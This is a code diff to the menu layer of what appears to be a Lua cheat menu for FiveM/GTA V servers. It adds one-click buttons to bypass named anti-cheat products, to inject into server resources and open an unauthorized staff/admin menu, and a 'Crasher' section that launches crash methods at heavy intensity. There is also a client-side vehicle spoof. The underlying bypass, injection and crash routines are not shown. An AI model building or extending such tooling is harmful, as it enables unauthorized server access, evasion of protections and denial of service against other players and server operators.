 -- ---------------------------------------------------------------------------
 -- EXPLOIT > BYPASS
 --
--- A profile is loaded by clicking the guard's name. There is no global toggle,
--- no manual profile dropdown and no separate Apply button. The profile only
--- uses the guard's own exports; V.apply no longer installs native hooks.
+-- Each entry is isolated: WaveShield, FiveGuard and Electron AC apply their own
+-- export profiles; Seed injects only into seed; Dynasty injects only into
+-- Putin; Raven uses only Raven's documented client movement-grace export. No
+-- entry applies a global profile to another vendor's resource.
 -- ---------------------------------------------------------------------------
 local function installBypassProfiles()
     local tab = findTab("Exploit", "Bypass")
     if not tab then return false end
 
-    removeItem("Exploit", "Bypass", "Bypass Putin")
-
-    tab.items = tab.items or {}
-    tab.items[#tab.items + 1] = {
-        name = "",
-        isSeparator = true,
-        separatorText = "Detected anti-cheat",
+    -- Replace the whole tab. This also removes old combined entries left
+    -- behind by a previous loader instance without requiring a GTA restart.
+    local ravenItem
+    ravenItem = {
+        name = "Raven",
+        type = "toggle",
+        value = false,
+        onClick = function(value)
+            local ok = V.setRaven(value)
+            ravenItem.value = ok and value or false
+        end,
     }
 
-    local seen = {}
-    for _, ac in ipairs(S.acs or {}) do
-        local profile = V.profiles[ac.vendor] or V.profiles.generic
-        if not seen[profile.label] then
-            seen[profile.label] = true
-
-            local target = ac
-            tab.items[#tab.items + 1] = {
-                name = profile.label,
-                type = "action",
-                onClick = function()
-                    -- Clicking the guard is the load action. No second step,
-                    -- no confirmation text, no notification.
-                    V.apply(target)
-                end,
-            }
-        end
-    end
+    tab.items = {
+        {
+            name = "WaveShield",
+            type = "action",
+            onClick = function() V.applyVendor("waveshield") end,
+        },
+        {
+            name = "FiveGuard",
+            type = "action",
+            onClick = function() V.applyVendor("fiveguard") end,
+        },
+        {
+            name = "Electron AC",
+            type = "action",
+            onClick = function() V.applyVendor("electron") end,
+        },
+        {
+            name = "Reason AC",
+            type = "action",
+            onClick = function() V.applyVendor("reason") end,
+        },
+        {
+            name = "Seed",
+            type = "action",
+            onClick = function() SB.apply() end,
+        },
+        {
+            name = "Dynasty",
+            type = "action",
+            dynasty = true,
+            onClick = function() V.applyDynasty() end,
+        },
+        ravenItem,
+    }
 
     return true
 end
@@ -20455,9 +21295,9 @@ end
 -- ---------------------------------------------------------------------------
 -- EXPLOIT > EXPLOITS
 --
--- Reuse the existing "Menu Staff" row and its dynasty frame. The profile is
--- Susano-only and targets the "seed" resource. A second click reopens the
--- already-built admin menu instead of building it twice.
+-- Reuse the existing "Menu Staff" row, but label it explicitly. The old
+-- [DYNASTY] badge was misleading here: this row is the Seed staff menu, not a
+-- Dynasty entry. A second click reopens the already-built admin menu.
 -- ---------------------------------------------------------------------------
 local function seedClick()
     if ST._injected then
@@ -20479,14 +21319,14 @@ local function installSeed()
 
     local seed = findItem("Exploit", "Exploits", "Menu Staff")
     if not seed then
-        seed = { name = "Seed", type = "action", dynasty = true }
+        seed = { name = "Menu Staff [SEED]", type = "action" }
         tab.items = tab.items or {}
         tab.items[#tab.items + 1] = seed
     end
 
-    seed.name = "Seed"
+    seed.name = "Menu Staff [SEED]"
     seed.type = "action"
-    seed.dynasty = true
+    seed.dynasty = nil
     seed.onClick = seedClick
     return true
 end
@@ -20547,33 +21387,27 @@ end
 
 -- ---------------------------------------------------------------------------
 -- CRASHER
--- Three methods, one selector and one button. The old Target/Intensity/Stop/
--- Probe/Chat rows are not exposed. Default intensity is Light so the first
--- click does not create a burst.
+-- Each method is its own action: click the method and it starts. There is no
+-- separate selector, no Crash button, no target/intensity/stop row.
 -- ---------------------------------------------------------------------------
 local function installCrasher()
-    local methodItem = {
-        name = "Method",
-        type = "selector",
-        options = {},
-        selected = C.method,
-        onClick = function(index)
-            C.setMethod(index)
-        end,
-    }
-    for i = 1, #C.METHODS do
-        methodItem.options[i] = C.METHODS[i].label
-    end
+    -- Fixed power per method; it is not exposed as a menu setting. Ped
+    -- variation and flood use Heavy; PTFX uses Standard.
+    local power = { 3, 3, 2 }
+    local items = {}
 
-    local crashItem = {
-        name = "Crash",
-        type = "action",
-        onClick = function()
-            C.setMethod(methodItem.selected or 1)
-            C.setIntensity(1)
-            C.launch()
-        end,
-    }
+    for i = 1, #C.METHODS do
+        local index = i
+        items[#items + 1] = {
+            name = C.METHODS[i].label,
+            type = "action",
+            onClick = function()
+                C.setMethod(index)
+                C.setIntensity(power[index] or 2)
+                C.launch()
+            end,
+        }
+    end
 
     addCategory({
         name = "Crasher",
@@ -20581,13 +21415,54 @@ local function installCrasher()
         tabs = {
             {
                 name = "Crasher",
-                items = {
-                    methodItem,
-                    crashItem,
-                },
+                items = items,
             },
         },
     })
+    return true
+end
+
+-- ---------------------------------------------------------------------------
+-- VEHICLE > SPOOFED
+--
+-- Network model stays whatever vehicle you are in; only this client renders a
+-- local Deluxo proxy. The Deluxo is created with isNetwork=false and never
+-- registered.
+-- ---------------------------------------------------------------------------
+local function installVehicleSpoof()
+    local category = findCategory("Vehicle")
+    if not category then return false end
+
+    category.tabs = category.tabs or {}
+    for i = #category.tabs, 1, -1 do
+        if category.tabs[i].name == "Spoofed" then
+            table.remove(category.tabs, i)
+        end
+    end
+
+    local spoofItem
+    spoofItem = {
+        name = "Spoofed Deluxo",
+        type = "toggle",
+        value = VS.enabled,
+        onClick = function(value)
+            local ok = VS.toggle(value)
+            spoofItem.value = ok and value or false
+        end,
+    }
+
+    category.tabs[#category.tabs + 1] = {
+        name = "Spoofed",
+        items = {
+            {
+                name = "",
+                isSeparator = true,
+                separatorText = "Local visual / current network vehicle",
+            },
+            spoofItem,
+        },
+    }
+
     return true
 end
 
@@ -20672,6 +21547,7 @@ local function build()
     installSeed()
     installProtection()
     installCrasher()
+    installVehicleSpoof()
 
     -- Re-check after the new categories are installed. This catches a stale
     -- category that was appended while the old menu table was still alive.
@@ -20725,7 +21601,7 @@ UI.boot()
 
 return UI
 
-end)(O,S,E,D,F,V,M,SN,C,A,ST,Menu)
+end)(O,S,E,D,F,V,M,SN,C,A,ST,SB,VS,Menu)
 
 
 end)()
